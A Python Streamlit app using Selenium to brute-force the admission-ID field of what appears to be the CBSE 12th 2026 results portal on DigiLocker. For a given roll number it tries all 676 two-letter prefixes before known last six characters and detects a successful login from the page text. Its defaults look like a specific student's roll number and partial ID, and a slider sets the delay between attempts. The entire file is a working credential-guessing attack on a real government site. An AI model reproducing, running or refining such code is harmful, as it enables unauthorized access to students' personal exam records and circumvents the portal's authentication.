import streamlit as st
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import time
import string

URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"

def get_driver():
    options = webdriver.ChromeOptions()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    return webdriver.Chrome(options=options)

def is_success(driver):
    try:
        try:
            error_elem = driver.find_element(By.ID, "err_msg")
            if error_elem.is_displayed() and error_elem.text.strip():
                return False
        except NoSuchElementException:
            pass
        
        success_indicators = ["marks", "result", "subject", "grade", "total", "percentage"]
        page_text = driver.page_source.lower()
        if any(ind in page_text for ind in success_indicators):
            return True
            
        if "result" in driver.current_url.lower() and "error" not in driver.current_url.lower():
            return True
    except:
        pass
    return False


# ====================== UI ======================
st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
st.title("🔍 CBSE 12th Result Brute Forcer - Fixed")

roll_number = st.text_input("Roll Number", value="18615900")
known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
delay = st.slider("Delay between attempts (seconds)", 2.0, 5.0, 2.8, 0.1)

if st.button("🚀 Start Brute Force", type="primary"):
    if len(known_last_6) != 6:
        st.error("Last 6 characters must be exactly 6.")
    else:
        status = st.empty()
        progress = st.empty()
        result_box = st.empty()
        debug = st.expander("Debug Log", expanded=True)

        driver = None
        try:
            driver = get_driver()
            driver.get(URL)
            
            # === CRITICAL: Wait for form to load ===
            wait = WebDriverWait(driver, 20)
            wait.until(EC.presence_of_element_located((By.ID, "rroll")))
            time.sleep(2)   # Extra safety

            status.success("✅ Form loaded successfully. Starting brute force...")

            letters = string.ascii_uppercase
            count = 0

            for first in letters:
                for second in letters:
                    code = f"{first}{second}{known_last_6}"
                    attempt = f"{first}{second}"
                    count += 1

                    progress.info(f"Progress: {count}/676 | Trying: {attempt} → {code}")

                    try:
                        # Wait + Fill
                        rroll = wait.until(EC.presence_of_element_located((By.ID, "rroll")))
                        rroll.clear()
                        rroll.send_keys(roll_number)

                        admn = wait.until(EC.presence_of_element_located((By.ID, "admn_id")))
                        admn.clear()
                        admn.send_keys(code)

                        # Submit
                        submit = wait.until(EC.element_to_be_clickable((By.ID, "submit")))
                        submit.click()

                        time.sleep(delay)

                        success = is_success(driver)
                        debug.write(f"{attempt} → Success: {success}")

                        if success:
                            result_box.success(f"""
                            SUCCESS FOUND!

                            Full Code: **{code}**
                            Prefix: **{attempt}**
                            """)
                            st.balloons()
                            break
                    except Exception as e:
                        debug.write(f"{attempt} → Error: {str(e)[:100]}")
                        continue

            else:
                st.error("❌ Finished all 676 attempts without success.")

        except Exception as e:
            st.error(f"Critical Error: {str(e)}")
        finally:
            if driver:
                driver.quit()
